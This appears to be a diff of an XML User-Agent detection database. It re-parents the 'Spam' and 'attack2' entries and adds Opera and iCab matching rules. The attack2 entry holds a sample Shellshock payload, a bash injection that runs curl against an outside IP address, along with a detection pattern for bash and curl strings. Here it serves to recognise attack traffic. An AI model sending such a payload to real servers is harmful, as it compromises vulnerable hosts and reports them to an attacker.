@@ -29,12 +29,12 @@
   <Child Id="811" Name="NovarraVision" Type="Browser" />
   <Child Id="1065" Name="OceanOS" Type="GateWay" />
   <Child Id="1158" Name="Platform" Type="GateWay" />
-  <Child Id="1173" Name="Spam" Type="Browser" />
   <Child Id="826" Name="TelligentComponents" Type="Browser" />
   <Child Id="803" Name="aCrawler" Type="GateWay" />
   <Child Id="801" Name="aMobile1" Type="GateWay" />
   <Child Id="802" Name="aMobile2" Type="GateWay" />
   <Child Id="805" Name="aOpera" Type="Browser" />
+  <Child Id="1168" Name="attack2" Type="Browser" />
   <Child Id="804" Name="bCrawler" Type="GateWay" />
   <Child Id="1133" Name="certifytheweb.com" Type="Browser" />
   <Child Id="810" Name="iCab" Type="Browser" />
@@ -87,10 +87,12 @@
   <Identification Type="Header" Name="User-Agent" Match="Opera(/|\s)(?'version'\d+\.\d+(\.\d+)?)" />
   <Identification Type="capability" Name="crawler" Match="False" />
   <Capture Type="Header" Name="User-Agent" Match="(?'layoutEngine'Presto)/(?'layoutEngineVersion'\d+\.\d+(\.\d+)?)" />
+  <Capture Type="Header" Name="User-Agent" Match="Version/(?'version1'\d+\.\d+(\.\d+)?)" />
   <Capability Name="browser" Value="Opera" />
   <Capability Name="version" Value="${version}" />
   <Capability Name="layoutEngineVersion" Value="${layoutEngineVersion}" />
   <Capability Name="layoutEngine" Value="${layoutEngine}" />
+  <Capability Name="User-Agent" Value="${version1}" />
   <Child Id="843" Name="OperaMini" Type="Browser" />
   <Child Id="844" Name="OperaMiniphone2" Type="GateWay" />
 </Browser>
@@ -128,7 +130,8 @@
   <Capability Name="version" Value="${version}" />
 </Browser>
 <Browser Id="810" ParentId="799" Prority="" Name="iCab">
-  <Identification Type="Header" Name="User-Agent" Match="^iCab/(?'version'\d+\.\d+(\.\d+)?)\sSafari" />
+  <Samples Name="User-Agent" Value="iCab/4.5 (Macintosh; U; Mac OS X Leopard 10.5.7)" />
+  <Identification Type="Header" Name="User-Agent" Match="^iCab/(?'version'\d+\.\d+(\.\d+)?)|iCab/(?'version'\d+\.\d+(\.\d+)?)\sSafari" />
   <Capability Name="browser" Value="iCab" />
   <Capability Name="version" Value="${version}" />
 </Browser>
@@ -181,6 +184,7 @@
   <Child Id="1159" Name="Trident" Type="GateWay" />
   <Child Id="807" Name="WebTV" Type="Browser" />
   <Child Id="850" Name="aMozillaGaleon" Type="Browser" />
+  <Child Id="1180" Name="iCab2" Type="Browser" />
 </Browser>
 <Browser Id="814" ParentId="799" Prority="" Name="Chromium_IRON">
   <Identification Type="Header" Name="User-Agent" Match="Iron/(?'version'\d+\.\d+(\.\d+)?)" />
@@ -479,6 +483,7 @@
   <Capability Name="browser" Value="${Browser}" />
   <Capability Name="version" Value="0.0" />
   <Child Id="928" Name="Malformed6" Type="Browser" />
+  <Child Id="1173" Name="Spam" Type="Browser" />
 </Browser>
 <Browser Id="858" ParentId="813" Prority="" Name="Mozilla3Compatible">
   <Samples Name="User-Agent" Value="Mozilla/3.0 (compatible; Links 0.83; FreeBSD 3.2-RELEASE i386; SV1; InfoPath.1" />
@@ -689,7 +694,6 @@
   <Child Id="966" Name="YahooSeeker" Type="Browser" />
   <Child Id="960" Name="YodaoBot" Type="Browser" />
   <Child Id="965" Name="YodaoBotMobile" Type="Browser" />
-  <Child Id="1168" Name="attack2" Type="Browser" />
   <Child Id="973" Name="gsacrawler" Type="Browser" />
   <Child Id="949" Name="heritrix" Type="Browser" />
   <Child Id="946" Name="iaarchiver" Type="Browser" />
@@ -2401,11 +2405,12 @@
   <Capability Name="mobileDeviceManufacturer" Value="RIM" />
   <Capability Name="mobileDeviceModel" Value="PlayBook" />
 </Browser>
-<Browser Id="1168" ParentId="883" Prority="" Name="attack2">
+<Browser Id="1168" ParentId="799" Prority="" Name="attack2">
   <Samples Name="User-Agent" Value="() { :;}; /bin/bash -c 'curl http://176.102.38.36/search/e.php?h=owenbrady.net/cgi-bin/'" />
   <Identification Type="Header" Name="User-Agent" Match="/bin/bash|/dev/null|\(curl |'curl" />
   <Capability Name="browser" Value="Script Injection Attack" />
   <Capability Name="OS" Value="Unknown" />
+  <Capability Name="crawler" Value="True" />
 </Browser>
 <Browser Id="1169" ParentId="912" Prority="" Name="Opera WebKit1">
   <Samples Name="User-Agent" Value="Mozilla/5.0 (Linux; Android 4.0.4; MW0711 Build/IMM76D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.138 Safari/537.36 OPR/22.0.1485.79355" />
@@ -2443,7 +2448,7 @@
   <Capability Name="appleWebTechnologyVersion" Value="${appleWebTechnologyVersion}" />
   <Capability Name="Chromeversion" Value="${Chromeversion}" />
 </Browser>
-<Browser Id="1173" ParentId="799" Prority="" Name="Spam">
+<Browser Id="1173" ParentId="857" Prority="" Name="Spam">
   <Samples Name="User-Agent" Value="&lt;a href=&quot;http://www.xxxxx.com/&quot;&gt;www.xxxxx.com&lt;/a&gt;" />
   <Identification Type="Header" Name="User-Agent" Match="&lt;a\shref=" />
   <Capability Name="browser" Value="Spam Bot" />
@@ -2490,5 +2495,11 @@
   <Samples Name="User-Agent" Value="Mozilla/5.0 (PlayStation 4 2.57) AppleWebKit/537.73 (KHTML, like Gecko)" />
   <Identification Type="Header" Name="User-Agent" Match="(?'browser'PLAYSTATION\s3);\s(?'version'\d+\.\d+)|(?'browser'PlayStation\s4)\s(?'version'\d+\.\d+(\.\d+)?)" />
   <Capability Name="browser" Value="${browser}" />
+  <Capability Name="version" Value="${version}" />
+</Browser>
+<Browser Id="1180" ParentId="813" Prority="" Name="iCab2">
+  <Samples Name="User-Agent" Value="Mozilla/4.5 (compatible; iCab 2.9.1; Macintosh; U; PPC)" />
+  <Identification Type="Header" Name="User-Agent" Match="iCab\s(?'version'\d+\.\d+(\.\d+)?)" />
+  <Capability Name="browser" Value="iCab" />
   <Capability Name="version" Value="${version}" />
 </Browser>
